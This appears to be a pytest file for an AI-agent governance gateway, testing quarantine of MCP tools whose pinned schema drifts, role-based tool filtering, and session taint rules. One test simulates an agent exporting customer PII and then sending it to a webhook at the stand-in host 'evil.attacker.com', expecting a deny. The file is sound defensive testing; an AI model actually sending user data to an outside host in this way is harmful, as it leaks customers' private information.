import hashlib
import json
import pytest
from httpx import ASGITransport, AsyncClient
from sqlalchemy import select

from core.database import db_context
from core.governance.taint_tracker import get_taint_tracker
from core.models.mcp import McpToolPinRecord
from core.pipeline.orchestrator import get_pipeline_orchestrator
from core.schemas.common import DecisionEnum, StageEnum
from core.schemas.events import ActionModel, ActorModel, EvaluationRequest
from core.schemas.policy import ConditionExpression, PolicyPackDefinition, PolicyRule, RuleAction
from gateways.pdp_api.main import app


@pytest.mark.asyncio
async def test_mcp_anti_rug_pull_quarantine_and_repin(api_client: AsyncClient):
    # 1. Register upstream server
    res_reg = await api_client.post(
        "/v1/mcp/servers",
        json={
            "name": "internal-db-mcp",
            "server_url": "http://mock-upstream.internal/mcp",
            "workspace_id": "default",
        },
    )
    assert res_reg.status_code == 201
    server_data = res_reg.json()
    assert server_data["name"] == "internal-db-mcp"

    # 2. Pin tool baseline
    db_schema = {"type": "object", "properties": {"query": {"type": "string"}}}
    res_pin = await api_client.post(
        "/v1/mcp/tools/query_database/pin",
        json={
            "workspace_id": "default",
            "description": "Query database tables safely",
            "input_schema": db_schema,
        },
    )
    assert res_pin.status_code == 200
    assert res_pin.json()["status"] == "pinned"
    assert res_pin.json()["is_quarantined"] is False

    # 3. Call tools/list via JSON-RPC -> query_database present
    res_list = await api_client.post(
        "/proxy/mcp/jsonrpc",
        json={"jsonrpc": "2.0", "id": "1", "method": "tools/list"},
    )
    assert res_list.status_code == 200
    tools = res_list.json()["result"]["tools"]
    assert any(t["name"] == "query_database" for t in tools)

    # 4. Simulate unexpected upstream schema drift (Anti-Rug-Pull trigger)
    # Alter the pin in DB to an unexpected hash
    async with db_context() as db:
        stmt = select(McpToolPinRecord).where(
            McpToolPinRecord.tenant_id == "default",
            McpToolPinRecord.tool_name == "query_database",
        )
        res = await db.execute(stmt)
        pin = res.scalar_one()
        pin.schema_hash = hashlib.sha256(b"unexpected_drifted_schema").hexdigest()
        await db.commit()

    # 5. Call tools/list -> Drift detected! Automatically quarantined and stripped from list
    res_list2 = await api_client.post(
        "/proxy/mcp/jsonrpc",
        json={"jsonrpc": "2.0", "id": "2", "method": "tools/list"},
    )
    tools2 = res_list2.json()["result"]["tools"]
    assert not any(t["name"] == "query_database" for t in tools2)

    # 6. Verify quarantined in quarantine registry endpoint
    res_quar = await api_client.get("/v1/mcp/tools/quarantine")
    assert res_quar.status_code == 200
    quarantined = res_quar.json()
    assert any(q["tool_name"] == "query_database" for q in quarantined)

    # 7. Attempting tools/call on quarantined tool -> Blocked with code -32002
    res_call = await api_client.post(
        "/proxy/mcp/jsonrpc",
        json={
            "jsonrpc": "2.0",
            "id": "3",
            "method": "tools/call",
            "params": {"name": "query_database", "arguments": {"query": "SELECT * FROM users"}},
        },
    )
    assert res_call.status_code == 200
    err_body = res_call.json().get("error", {})
    assert err_body.get("code") == -32002
    assert "quarantined" in err_body.get("message", "").lower()

    # 8. Admin reviews & re-pins tool with current schema -> Un-quarantined
    res_repin = await api_client.post(
        "/v1/mcp/tools/query_database/pin",
        json={
            "workspace_id": "default",
            "description": "Query database tables safely",
            "input_schema": db_schema,
        },
    )
    assert res_repin.status_code == 200
    assert res_repin.json()["is_quarantined"] is False

    # 9. tools/call now succeeds
    res_call_ok = await api_client.post(
        "/proxy/mcp/jsonrpc",
        json={
            "jsonrpc": "2.0",
            "id": "4",
            "method": "tools/call",
            "params": {"name": "query_database", "arguments": {"query": "SELECT 1"}},
        },
    )
    assert res_call_ok.status_code == 200
    assert "result" in res_call_ok.json()


@pytest.mark.asyncio
async def test_mcp_role_based_tool_filtering(api_client: AsyncClient):
    orchestrator = get_pipeline_orchestrator()

    # Register policy pack restricting 'viewer' to only 'read_file'
    pack = PolicyPackDefinition(
        id="mcp-role-pack",
        name="MCP Role Pack",
        budgets={
            "delegation": {
                "role_tool_permissions": {
                    "viewer": ["read_file"],
                }
            }
        },
    )
    orchestrator.policy_engine.register_policy_pack(pack)

    # Call tools/list as viewer -> Only read_file returned
    res = await api_client.post(
        "/proxy/mcp/jsonrpc",
        headers={
            "X-Aegis-Policy-Pack": "mcp-role-pack",
            "X-Aegis-Actor-Role": "viewer",
        },
        json={"jsonrpc": "2.0", "id": "10", "method": "tools/list"},
    )
    tools = res.json()["result"]["tools"]
    tool_names = [t["name"] for t in tools]
    assert "read_file" in tool_names
    assert "query_database" not in tool_names


@pytest.mark.asyncio
async def test_session_taint_toxic_chain_blocking():
    orchestrator = get_pipeline_orchestrator()
    taint_tracker = get_taint_tracker()

    # Policy pack with multi-step taint tracking
    pack = PolicyPackDefinition(
        id="taint-pack",
        name="Taint Pack",
        rules=[
            PolicyRule(
                id="taint-export",
                name="Taint Session on Customer Export",
                priority=10,
                stages=["tool_pre_call"],
                condition=ConditionExpression(
                    field="action.name",
                    operator="eq",
                    value="export_customer_pii",
                ),
                action=RuleAction(
                    decision=DecisionEnum.ALLOW,
                    add_taints=["customer_pii_extracted"],
                ),
            ),
            PolicyRule(
                id="block-outbound-tainted",
                name="Block Webhook on Tainted Session",
                priority=5,
                stages=["tool_pre_call"],
                condition=ConditionExpression(
                    all=[
                        ConditionExpression(field="action.name", operator="eq", value="send_outbound_webhook"),
                        ConditionExpression(field="session.taints", operator="contains", value="customer_pii_extracted"),
                    ]
                ),
                action=RuleAction(
                    decision=DecisionEnum.DENY,
                    reason="Data exfiltration blocked: Session is tainted with customer_pii_extracted",
                ),
            ),
        ],
    )
    orchestrator.policy_engine.register_policy_pack(pack)

    tenant_id = "taint-corp"
    session_a = "sess-taint-alpha"
    session_b = "sess-clean-beta"

    # Clear any previous taints
    await taint_tracker.clear_taints(tenant_id, session_a)
    await taint_tracker.clear_taints(tenant_id, session_b)

    # Step 1: In session A, agent executes export_customer_pii
    req1 = EvaluationRequest(
        tenant_id=tenant_id,
        session_id=session_a,
        policy_pack_id="taint-pack",
        stage=StageEnum.TOOL_PRE_CALL,
        actor=ActorModel(id="agent-01", role="worker"),
        action=ActionModel(name="export_customer_pii", parameters={"dataset": "users"}),
    )
    v1 = await orchestrator.evaluate(req1)
    assert v1.decision == DecisionEnum.ALLOW

    # Verify session A acquired the taint
    taints_a = await taint_tracker.get_taints(tenant_id, session_a)
    assert "customer_pii_extracted" in taints_a

    # Step 2: In session A, agent attempts to exfiltrate via send_outbound_webhook
    req2 = EvaluationRequest(
        tenant_id=tenant_id,
        session_id=session_a,
        policy_pack_id="taint-pack",
        stage=StageEnum.TOOL_PRE_CALL,
        actor=ActorModel(id="agent-01", role="worker"),
        action=ActionModel(name="send_outbound_webhook", parameters={"url": "https://evil.attacker.com"}),
    )
    v2 = await orchestrator.evaluate(req2)
    assert v2.decision == DecisionEnum.DENY
    assert "Data exfiltration blocked" in v2.triggered_rules[0].reason

    # Step 3: In clean session B, executing send_outbound_webhook is ALLOWED
    req3 = EvaluationRequest(
        tenant_id=tenant_id,
        session_id=session_b,
        policy_pack_id="taint-pack",
        stage=StageEnum.TOOL_PRE_CALL,
        actor=ActorModel(id="agent-02", role="worker"),
        action=ActionModel(name="send_outbound_webhook", parameters={"url": "https://partner.api.internal"}),
    )
    v3 = await orchestrator.evaluate(req3)
    assert v3.decision == DecisionEnum.ALLOW
